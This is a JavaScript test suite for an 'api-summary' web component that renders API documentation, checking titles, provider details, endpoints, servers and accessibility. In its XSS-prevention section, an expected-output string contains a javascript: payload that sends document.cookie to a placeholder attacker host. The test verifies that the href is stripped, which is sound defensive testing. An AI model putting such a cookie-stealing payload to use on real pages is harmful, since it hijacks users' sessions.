/* eslint-disable prefer-object-spread */
import { fixture, assert, aTimeout, html, nextFrame } from '@open-wc/testing';
import sinon from 'sinon';
import '../api-summary.js';
import { AmfLoader } from './amf-loader.js';

/** @typedef {import('..').ApiSummary} ApiSummary */

describe('ApiSummary', () => {
  /**
   * @returns {Promise<ApiSummary>}
   */
  async function basicFixture() {
    return fixture(html`<api-summary></api-summary>`);
  }

  /**
   * @param {any} amf
   * @returns {Promise<ApiSummary>}
   */
  async function modelFixture(amf) {
    const element = /** @type ApiSummary */ (await fixture(html`<api-summary .amf="${amf}"></api-summary>`));
    await aTimeout(0);
    return element;
  }

  [
    ['Full AMF model', false],
    ['Compact AMF model', true]
  ].forEach(([label, compact]) => {
    describe(String(label), () => {
      describe('Basic', () => {
        let element = /** @type ApiSummary */ (null);
        let amf;
        before(async () => {
          amf = await AmfLoader.load(compact);
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
        });

        it('renders api title', () => {
          const node = element.shadowRoot.querySelector('[role="heading"]');
          assert.dom.equal(node, `<div aria-level="2" class="api-title" role="heading" part="api-title">
            <label part="api-title-label">
              API title:
            </label>
            <span>
              API body demo
            </span>
          </div>`);
        });

        it('renders version', () => {
          const node = element.shadowRoot.querySelector('.inline-description.version span');
          assert.dom.equal(node, '<span>v1</span>');
        });

        it('renders protocols', () => {
          const node = element.shadowRoot.querySelector('.protocol-chips');
          assert.dom.equal(
            node,
            `<div class="protocol-chips">
            <span class="chip">
                HTTP
            </span>
            <span class="chip">
              HTTPS
            </span>
          </div>`
          );
        });

        it('renders description', () => {
          const node = element.shadowRoot.querySelector('arc-marked .markdown-body');
          const content = node.innerHTML.trim();
          assert.ok(content, 'has description');
          const strong = node.querySelector('strong');
          assert.dom.equal(
            strong,
            '<strong>markdown</strong>',
            { ignoreAttributes: ['class'] },
          );
          const anchor = node.querySelector('a');
          assert.dom.equal(
            anchor,
            '<a>asd</a>',
            { ignoreAttributes: ['class'] },
          );
        });

        it('renders base uri', () => {
          const node = element.shadowRoot.querySelector('api-url');
          assert.equal(node.url, `https://{instance}.domain.com`);
        });

        it('renders endpoints template', () => {
          const node = element.shadowRoot.querySelector('.endpoints-title');
          assert.dom.equal(node, `<label class="endpoints-title section">API endpoints</label>`);
        });
      });

      describe('OAS properties', () => {
        let amf;
        let element = /** @type ApiSummary */ (null);

        before(async () => {
          amf = await AmfLoader.load(compact, 'loan-microservice');
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
          await nextFrame();
        });

        it('provider section is rendered', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"]');
          assert.ok(node);
        });

        it('renders provider name', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
          assert.dom.equal(node, `<span class="provider-name">John Becker</span>`);
        });

        it('renders provider email', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
          assert.dom.equal(
            node,
            `<a class="app-link link-padding provider-email" href="mailto:JohnBecker@cognizant.com">
            JohnBecker@cognizant.com
          </a>`
          );
        });

        it('renders provider url', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
          assert.dom.equal(
            node,
            `<a class="app-link provider-url" href="http://domain.com" target="_blank">http://domain.com</a>`
          );
        });

        it('renders license region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
          assert.ok(node);
        });

        it('renders license link', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
          assert.dom.equal(
            node,
            `<a class="app-link" href="https://www.apache.org/licenses/LICENSE-2.0.html" target="_blank">
            Apache 2.0
          </a>`
          );
        });

        it('Renders ToS region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
          assert.ok(node);
        });
      });

      describe('Prevent XSS attacks', () => {
        let amf;
        let element = /** @type ApiSummary */ (null);

        before(async () => {
          amf = await AmfLoader.load(compact, 'prevent-xss');
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
        });

        it('provider section is rendered', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"]');
          assert.ok(node);
        });

        it('renders provider name', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-name');
          assert.dom.equal(node, `<span class="provider-name">Wally</span>`);
        });

        it('renders provider email', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-email');
          assert.dom.equal(
            node,
            `<a class="app-link link-padding provider-email" href="mailto:wallythebest@wally.com">
            wallythebest@wally.com
          </a>`
          );
        });

        it('renders provider url without malicious href', () => {
          const node = element.shadowRoot.querySelector('[role="contentinfo"] .provider-url');
          assert.dom.equal(
            node,
            `<a class="app-link provider-url" target="_blank">
              javascript:window.location='http://attacker/?cookie='+document.cookie</a>`
          );
        });

        it('renders license region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"]');
          assert.ok(node);
        });

        it('renders license without malicious href', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="licenseLabel"] a');
          assert.dom.equal(
            node,
            `<a class="app-link" target="_blank">
            I swear if you click below you will have the most amazing experience ever. I promise.
          </a>`
          );
        });

        it('Renders ToS region', () => {
          const node = element.shadowRoot.querySelector('[aria-labelledby="tocLabel"]');
          assert.ok(node);
        });
      });

      describe('Endpoints rendering', () => {
        let element = /** @type ApiSummary */ (null);
        let amf;

        before(async () => {
          amf = await AmfLoader.load(compact);
        });

        beforeEach(async () => {
          element = await basicFixture();
          element.amf = amf;
          await aTimeout(0);
        });

        it('adds separator', () => {
          const node = element.shadowRoot.querySelector('.separator');
          assert.ok(node);
        });

        it('renders all endpoints', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item');
          assert.lengthOf(nodes, 12);
        });

        it('renders endpoint name', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
          assert.dom.equal(
            node,
            `<a
              class="endpoint-path"
              data-shape-type="endpoint"
              href="#/people"
              title="Open endpoint documentation"
              >
              People
            </a>`,
            {
              ignoreAttributes: ['data-id']
            }
          );
        });

        it('sets data-id on name', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
          assert.ok(node.getAttribute('data-id'));
        });

        it('renders endpoint path with name', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path-name');
          assert.dom.equal(node, `<p class="endpoint-path-name">/people</p>`, {
            ignoreAttributes: ['data-id']
          });
        });

        it('sets data-id on path', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.endpoint-path');
          assert.ok(node.getAttribute('data-id'));
        });

        it('renders list of operations', () => {
          const nodes = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelectorAll('.method-label');
          assert.lengthOf(nodes, 3);
        });

        it('renders operation method', () => {
          const node = element.shadowRoot.querySelectorAll('.endpoint-item')[2].querySelector('.method-label');
          assert.dom.equal(
            node,
            `<a
              class="method-label"
              data-method="get"
              data-shape-type="method"
              href="#/people/get"
              title="Open method documentation"
              >get</a>`,
            {
              ignoreAttributes: ['data-id']
            }
          );
        });

        it('Click on an endpoint dispatches navigation event', (done) => {
          const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'endpoint');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });

        it('Click on an endpoint path dispatches navigation event', (done) => {
          const node = element.shadowRoot.querySelector(`.endpoint-path[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'endpoint');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });

        it('Click on a method dispatches navigation event', (done) => {
          const node = element.shadowRoot.querySelector(`.method-label[data-id]`);
          element.addEventListener('api-navigation-selection-changed', (e) => {
            // @ts-ignore
            const {detail} = e;
            assert.typeOf(detail.selected, 'string');
            assert.equal(detail.type, 'method');
            done();
          });
          /** @type HTMLElement */ (node).click();
        });
      });

      describe('Server rendering', () => {
        let ramlSingleServerAmf;
        let oasMultipleServersAmf;
        let oasMultipleServersWithDescriptionAmf;
        let noServersAmf;
        before(async () => {
          ramlSingleServerAmf = await AmfLoader.load(compact);
          oasMultipleServersAmf = await AmfLoader.load(compact, 'multiple-servers');
          oasMultipleServersWithDescriptionAmf = await AmfLoader.load(compact, 'APIC-641');
          noServersAmf = await AmfLoader.load(compact, 'no-server');
        });

        it('renders URL area with a single server', async () => {
          const element = await modelFixture(ramlSingleServerAmf);
          const node = element.shadowRoot.querySelector('api-url');
          assert.ok(node);
        });

        it('renders single server URL', async () => {
          const element = await modelFixture(ramlSingleServerAmf);
          const node = element.shadowRoot.querySelector('api-url');
          assert.equal(node.url, 'https://{instance}.domain.com');
        });

        it('renders multiple servers', async () => {
          const element = await modelFixture(oasMultipleServersAmf);
          const node = element.shadowRoot.querySelector('.servers');
          assert.ok(node);
        });

        it('renders multiple URLs', async () => {
          const element = await modelFixture(oasMultipleServersAmf);
          const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
          assert.lengthOf(nodes, 3, 'has 3 servers');
          assert.equal(nodes[0].textContent.trim(), 'http://petstore.swagger.io/v1');
          assert.equal(nodes[1].textContent.trim(), 'http://dev.petstore.swagger.io/v1');
          assert.equal(nodes[2].textContent.trim(), 'https://{environment}.example.com/v2');
        });

        it('does not render URL area when no servers', async () => {
          const element = await modelFixture(noServersAmf);
          const urlNode = element.shadowRoot.querySelector('.url-area');
          assert.notOk(urlNode);
          const serversNode = element.shadowRoot.querySelector('.servers');
          assert.notOk(serversNode);
        });

        it('renders multiple URLs with descriptions', async () => {
          const element = await modelFixture(oasMultipleServersWithDescriptionAmf);
          const nodes = element.shadowRoot.querySelectorAll('.server-lists li');
          assert.lengthOf(nodes, 4, 'has 4 servers');
          assert.equal(nodes[0].textContent.trim(), 'https://api.aws-west-prd.capgroup.com/cdp-proxy/profiles\n      MuleSoft PROD');
          assert.equal(nodes[1].textContent.trim(), 'https://api.aws-west-snp.capgroup.com/cdp-proxy-e2e/profiles\n      MuleSoft UAT (for enterprise consumers)');
          assert.equal(nodes[2].textContent.trim(), 'https://api.aws-west-oz.capgroup.com/cdp-proxy-ite2/profiles\n      MuleSoft QA (for enterprise consumers)');
          assert.equal(nodes[3].textContent.trim(), 'https://api.aws-west-oz.capgroup.com/cdp-proxy-dev2/profiles');
        });
      });

      describe('AsyncAPI', () => {
        const asyncApi = 'async-api';
        let asyncAmf;
        let element = /** @type ApiSummary */ (null);

        before(async () => {
          asyncAmf = await AmfLoader.load(compact, asyncApi);
        });

        beforeEach(async () => {
          element = await modelFixture(asyncAmf);
        });

        it('should render server uri for API', () => {
          assert.equal(element.shadowRoot.querySelector('api-url').url, 'amqp://broker.mycompany.com');
        });

        it('should render "API channels" message', () => {
          assert.equal(element.shadowRoot.querySelector('.section.endpoints-title').textContent, 'API channels');
        });
      });

      describe('hideToc', () => {
        let element = /** @type ApiSummary */ (null);
        beforeEach(async () => {
          element = await basicFixture();
          element.setAttribute('hideToc', 'true');
          await aTimeout(0);
        });

        it('does not render endpoints template', () => {
          const node = element.shadowRoot.querySelector('.toc');
          assert.isNull(node);
        });
      });
    });
  });


  describe('_computeBaseUri()', () => {
    let element = /** @type ApiSummary */ (null);
    beforeEach(async () => {
      element = await basicFixture();
    });

    it('calls helper method _getBaseUri()', () => {
      const spy = sinon.spy(element, '_getBaseUri');
      element._computeBaseUri({}, 'https://api.com');
      assert.isTrue(spy.called);
    });

    it('returns a string', () => {
      const result = element._computeBaseUri({}, 'https://api.com/api');
      assert.equal(result, 'https://api.com/api');
    });

    it('removes trailing slash', () => {
      const result = element._computeBaseUri({}, 'https://api.com/');
      assert.equal(result, 'https://api.com');
    });

    it('returns empty string when no info', () => {
      const result = element._computeBaseUri({});
      assert.equal(result, '');
    });
  });

  describe('_computeProvider()', () => {
    let model;
    let element = /** @type ApiSummary */ (null);

    beforeEach(async () => {
      element = await basicFixture();
      model = {
        'http://a.ml/vocabularies/core#provider': [
          {
            '@id': 'amf://id#369',
            '@type': ['http://schema.org/Organization', 'http://a.ml/vocabularies/document#DomainElement'],
            'http://a.ml/vocabularies/core#url': [
              {
                '@id': 'http://domain.com'
              }
            ],
            'http://a.ml/vocabularies/core#name': [
              {
                '@value': 'John Doe'
              }
            ],
            'http://a.ml/vocabularies/core#email': [
              {
                '@value': 'test@mail.com'
              }
            ]
          }
        ]
      };
    });

    it('Computes provider model', () => {
      const result = element._computeProvider(model);
      assert.typeOf(result, 'object');
    });

    it('Removes nested array', () => {
      const p = [Object.assign({}, model['http://a.ml/vocabularies/core#provider'][0])];
      model['http://a.ml/vocabularies/core#provider'][0] = p;
      const result = element._computeProvider(model);
      assert.typeOf(result, 'object');
    });
  });

  describe('a11y', () => {
    let amf;
    let element = /** @type ApiSummary */ (null);

    before(async () => {
      amf = await AmfLoader.load(false, 'loan-microservice');
    });

    beforeEach(async () => {
      element = await basicFixture();
      element.amf = amf;
      await aTimeout(0);
    });

    it('passes accessibility test', async () => {
      await assert.isAccessible(element, {
        ignoredRules: ['color-contrast']
      });
    });
  });
});
